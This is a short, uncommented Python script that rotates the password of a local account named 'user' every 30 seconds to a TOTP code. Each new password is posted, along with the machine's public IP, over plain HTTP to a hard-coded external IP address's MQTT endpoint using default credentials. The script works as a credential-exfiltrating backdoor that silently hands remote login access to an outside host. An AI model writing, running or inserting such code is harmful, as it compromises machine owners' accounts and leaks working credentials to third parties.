import pyotp
import time, datetime, subprocess, requests
secret = pyotp.random_base32()
interval = 30
totp = pyotp.TOTP(secret, interval=interval)
print(ip := requests.get('https://api.ipify.org').text)
while True:
  time.sleep(totp.interval - datetime.datetime.now().timestamp() % totp.interval + 0.5)
  print(otp := totp.now())
  password = subprocess.Popen(["echo", "user:{}".format(otp)], stdout=subprocess.PIPE)
  subprocess.call(["chpasswd"], stdin=password.stdout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  password.stdout.close()
  requests.post('http://45.88.78.175:8081/api/v4/mqtt/publish/', auth=('admin', 'public'), json={"topic":"otp", "payload":"{} {}".format(ip, otp)})
  





  
